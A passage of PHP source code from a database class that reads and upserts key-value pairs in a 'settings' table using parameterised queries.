      $sql = "SELECT `setting_value` FROM `settings` WHERE `setting_key` = :key LIMIT 1";
      $this->query($sql);
      $this->bind(':key', $key);
      $this->execute();
      $res = $this->fetch();
      return $res ? $res->setting_value : null;
    } catch (Exception $e) {
      return null;
    }
  }

  public function updateSetting($key, $value)
  {
    $this->setupSettingsTable();
    try {
      $sql = "INSERT INTO `settings` (`setting_key`, `setting_value`) 
                    VALUES (:key, :val) 
                    ON DUPLICATE KEY UPDATE `setting_value` = :val";
      $this->query($sql);
      $this->bind(':key', $key);
      $this->bind(':val', (string) $value);
      return $this->execute();
    } catch (Exception $e) {
      return false;
    }
  }
}
